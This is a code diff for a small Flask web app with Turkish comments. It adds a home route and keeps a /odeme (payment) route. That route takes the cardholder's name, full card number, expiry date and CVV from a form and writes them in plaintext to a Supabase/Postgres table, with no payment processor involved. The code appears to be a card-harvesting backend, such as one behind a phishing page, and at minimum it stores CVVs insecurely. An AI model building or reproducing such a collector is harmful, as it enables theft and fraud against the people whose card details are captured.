@@ -1,5 +1,5 @@
 import os
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request
 import psycopg2  # PostgreSQL bağlantısı için
 
 app = Flask(__name__)
@@ -21,33 +21,15 @@ def get_db_connection():
     )
     return conn
 
-# Veritabanında tablo yoksa otomatik oluşturan fonksiyon
-def init_db():
-    try:
-        conn = get_db_connection()
-        cur = conn.cursor()
-        cur.execute('''
-            CREATE TABLE IF NOT EXISTS siparisler (
-                id SERIAL PRIMARY KEY,
-                ad_soyad VARCHAR(100),
-                kart_numarasi VARCHAR(50),
-                son_kullanma VARCHAR(10),
-                cvv VARCHAR(5),
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        conn.commit()
-        cur.close()
-        conn.close()
-    except Exception as e:
-        print("DB init error:", e)
+# 1. ANA SAYFA (404 Hatasını Çözen Kısım)
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-# Uygulama başladığında tabloyu kontrol et/oluştur
-init_db()
-
+# 2. ÖDEME / FORM GÖNDERME ROTASI
 @app.route('/odeme', methods=['POST'])
 def odeme():
-    # HTML formundan gelen verileri alıyoruz
+    # HTML formundan gelen veriler
     adsoyad = request.form.get('adsoyad')
     kart_numarasi = request.form.get('kart_numarasi')
     skt = request.form.get('skt')
@@ -56,7 +38,7 @@ def odeme():
     conn = get_db_connection()
     cur = conn.cursor()
     
-    # Sütun isimleri Supabase ile birebir aynı hale getirildi:
+    # Supabase veritabanına kaydetme
     cur.execute(
         "INSERT INTO siparisler (ad_soyad, kart_numarasi, son_kullanma, cvv) VALUES (%s, %s, %s, %s)",
         (adsoyad, kart_numarasi, skt, cvv)
